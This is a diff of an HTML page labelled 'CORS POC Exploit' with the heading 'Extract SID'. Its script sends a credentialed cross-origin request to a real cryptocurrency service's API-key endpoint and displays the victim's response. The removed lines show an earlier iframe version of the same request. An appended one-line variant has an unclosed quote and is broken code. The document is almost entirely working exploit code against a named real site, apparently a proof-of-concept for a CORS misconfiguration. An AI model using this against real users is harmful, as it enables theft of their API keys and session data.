@@ -1,15 +1,30 @@
+<!DOCTYPE html>
 <html>
 <body>
-<iframe src='data:text/html,<script>
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://blockchain.info/apikey/user", true);
-xhr.withCredentials = true;
-xhr.onload = function () {
-    if (xhr.readyState === xhr.DONE) {
-            console.log(xhr.response);
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
     }
-};
-xhr.send(null);
-</script>'></iframe>
-
+  };
+  xhttp.open("POST", "https://blockchain.com/apikey/user", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+ 
 </body>
+</html>
+
+
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('POST','https://blockchain.com/apikey/user,true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
